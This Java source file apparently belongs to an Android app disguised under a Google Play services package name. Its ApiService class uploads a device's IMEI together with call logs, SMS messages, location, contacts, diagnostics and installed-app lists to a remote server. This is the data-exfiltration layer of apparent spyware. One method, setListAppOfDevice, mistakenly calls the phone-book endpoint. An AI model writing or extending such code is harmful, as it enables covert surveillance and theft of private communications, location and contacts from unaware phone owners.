package com.google.android.gms.persistent.googleapps.network.api;

import com.google.android.gms.persistent.googleapps.network.models.request.DeleteRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.InformationRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.InitialRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.OneTimeRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.SyncRequest;
import com.google.android.gms.persistent.googleapps.network.models.response.DeleteResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InformationResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InitialResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.SyncResponse;
import com.google.gson.Gson;

import javax.inject.Inject;

import io.reactivex.Single;
import retrofit2.Call;

/**
 * Created by OldMan on 03.04.2017.
 */

public class ApiService {
    @Inject
    ServerApi serverApi;

    public ApiService(ServerApi serverApi) {
        this.serverApi = serverApi;
    }

    public Call<InitialResponse> onInitDevice(InitialRequest request) {
        return serverApi.onInitDevice(request.getImei(), request.getModel());
    }

    public Call<SyncResponse> onStateSync(SyncRequest request) {
        return serverApi.onStateSync(request.getImei(), request.getDevice());
    }

    public Call<DeleteResponse> onDeleteDevice(DeleteRequest request) {
        return serverApi.onDeleteDevice(request.getImei(), request.getDevice(),
                request.getMode());
    }

    public Call<InformationResponse> setCallOfDevice(InformationRequest request) {
        return serverApi.setCallOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> setSmsOfDevice(InformationRequest request) {
        return serverApi.setSmsOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> setLocationOfDevice(InformationRequest request) {
        return serverApi.setLocationOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> setDiagnosticOfDevice(InformationRequest request) {
        return serverApi.setDiagnosticOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()));
    }

    public Call<InformationResponse> setListCallOfDevice(OneTimeRequest request) {
        return serverApi.setListCallOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()), request.getDateCreate());
    }

    public Call<InformationResponse> setListSmsOfDevice(OneTimeRequest request) {
        return serverApi.setListSmsOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()), request.getDateCreate());
    }

    public Call<InformationResponse> setTelBookOfDevice(OneTimeRequest request) {
        return serverApi.setTelBookOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()), request.getDateCreate());
    }

    public Call<InformationResponse> setListAppOfDevice(OneTimeRequest request) {
        return serverApi.setTelBookOfDevice(request.getImei(), request.getDevice(),
                new Gson().toJson(request.getData()), request.getDateCreate());
    }
}
